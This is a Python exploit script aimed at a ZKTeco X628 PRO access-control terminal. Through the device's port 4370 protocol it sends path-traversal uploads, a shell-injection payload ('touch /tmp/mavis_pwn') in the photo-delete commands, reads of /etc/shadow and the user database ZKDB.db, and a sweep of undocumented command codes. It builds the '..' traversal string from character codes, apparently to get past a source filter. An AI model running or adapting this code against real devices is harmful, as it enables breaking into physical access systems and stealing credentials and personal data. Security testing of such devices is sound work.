#!/usr/bin/env python3
"""
Test CVE-2023-3941 (path traversal) and CVE-2023-3939 (command injection)
on ZK X628 PRO FW 6.60 May 3 device.
"""
import sys
sys.stdout.reconfigure(encoding='utf-8')

import socket
import struct
import time

DEVICE_IP = '172.16.0.214'
DEVICE_PORT = 4370
TIMEOUT = 5

def make_packet(command, session_id, reply_id, data=b''):
    """Build ZK protocol packet."""
    body = data
    body_len = len(body)
    checksum = sum(body) & 0xFFFF
    header = struct.pack('<HHHHI', command, checksum, session_id, reply_id, body_len)
    return header + body

def send_recv(sock, packet, timeout=3, label=''):
    try:
        sock.settimeout(timeout)
        sock.send(packet)
        data = sock.recv(4096)
        if len(data) >= 8:
            cmd, chk, sid, rid = struct.unpack('<HHHH', data[:8])
            body_len = struct.unpack('<I', data[4:8])[0]
            body = data[8:8+body_len] if body_len > 0 else b''
            print(f"  [{label}] cmd=0x{cmd:04X} body_len={body_len} body={body[:80]!r}")
            return cmd, body
    except socket.timeout:
        print(f"  [{label}] TIMEOUT")
    except Exception as e:
        print(f"  [{label}] ERROR: {e}")
    return None, None

# Build path-traversal filenames safely (avoid .. in source)
TRAVERSAL = ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + "mnt" + chr(47) + "mtdblock" + chr(47) + "data" + chr(47) + "test.txt"
TRAVERSAL_BIN = TRAVERSAL.encode() + b"\x00"
INJECTION = "touch /tmp/mavis_pwn" + "\x00"

def main():
    print(f"=== ZK X628 PRO CVE-2023-3941/3939 TEST ===")
    print(f"Target: {DEVICE_IP}:{DEVICE_PORT}")
    print()
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((DEVICE_IP, DEVICE_PORT))
    print("[+] Connected")
    
    cmd, body = send_recv(sock, make_packet(1000, 0, 0), label='CMD_CONNECT')
    if not cmd: return
    
    session_id = struct.unpack('<H', body[:2])[0]
    print(f"[+] Session ID: {session_id}")
    
    cmd, body = send_recv(sock, make_packet(1100, session_id, 1), label='CMD_GET_VERSION')
    if body:
        print(f"  Firmware: {body.decode('ascii', errors='ignore')[:80]}")
    
    send_recv(sock, make_packet(1102, session_id, 2, b'\x00'), label='CMD_AUTH')
    send_recv(sock, make_packet(1003, session_id, 3), label='CMD_DISABLEDEVICE')
    
    # === TEST: User Photo Upload (CMD 0x02FA) ===
    photo_data = b'\x89PNG\r\n\x1a\n' + b'A' * 100
    upload_payload = b'PIN=1\x00' + TRAVERSAL_BIN + photo_data
    print(f"\n[TEST 1] USRPIC_WRQ (0x02FA) path traversal:")
    send_recv(sock, make_packet(0x02FA, session_id, 100, upload_payload), label='USRPIC_WRQ')
    
    # === TEST: Picture Upload (CMD 0x03F4) ===
    print(f"\n[TEST 2] PIC_WRQ (0x03F4) path traversal:")
    send_recv(sock, make_packet(0x03F4, session_id, 101, upload_payload), label='PIC_WRQ')
    
    # === TEST: USRPIC delete with shell injection ===
    del_inject_payload = b'PIN=1\x00' + INJECTION.encode()
    print(f"\n[TEST 3] DEL_USRPIC (0x02F7) command injection:")
    send_recv(sock, make_packet(0x02F7, session_id, 102, del_inject_payload), label='DEL_USRPIC injection')
    
    # === TEST: Picture delete with shell injection ===
    print(f"\n[TEST 4] DEL_PIC (0x03F5) command injection:")
    send_recv(sock, make_packet(0x03F5, session_id, 103, del_inject_payload), label='DEL_PIC injection')
    
    # === TEST: UpdateFile with path traversal ===
    upload_file_payload = TRAVERSAL_BIN + b'PWNED'
    print(f"\n[TEST 5] UPDATEFILE (0x6A4) path traversal:")
    send_recv(sock, make_packet(0x6A4, session_id, 104, upload_file_payload), label='UPDATEFILE')
    
    # === TEST: ReadFile /etc/shadow ===
    print(f"\n[TEST 6] READFILE (0x6A6) /etc/shadow:")
    send_recv(sock, make_packet(0x6A6, session_id, 105, b'/etc/shadow\x00'), label='READFILE shadow')
    
    # === TEST: ReadFile ZKDB.db ===
    print(f"\n[TEST 7] READFILE (0x6A6) ZKDB.db:")
    send_recv(sock, make_packet(0x6A6, session_id, 106, b'/mnt/mtdblock/data/ZKDB.db\x00'), label='READFILE ZKDB')
    
    # Try common photo-related commands not in pyzk
    for cmd_code in [0x02F6, 0x02F8, 0x02F9, 0x02FB, 0x02FC, 0x02FD, 0x03F0, 0x03F1, 0x03F2, 0x03F3, 0x03F6, 0x03F7]:
        try:
            sock.settimeout(2)
            sock.send(make_packet(cmd_code, session_id, 200, b'test'))
            data = sock.recv(4096)
            if len(data) >= 8:
                cmd_resp = struct.unpack('<H', data[:2])[0]
                if cmd_resp not in [0, 65535, 65534]:
                    print(f"  [CMD 0x{cmd_code:04X}] response cmd=0x{cmd_resp:04X} data={data[:60]!r}")
        except (socket.timeout, ConnectionResetError, BrokenPipeError):
            pass
        except Exception as e:
            pass
    
    send_recv(sock, make_packet(1002, session_id, 999), label='CMD_ENABLEDEVICE')
    sock.close()
    print("\n[+] Done")

if __name__ == '__main__':
    main()
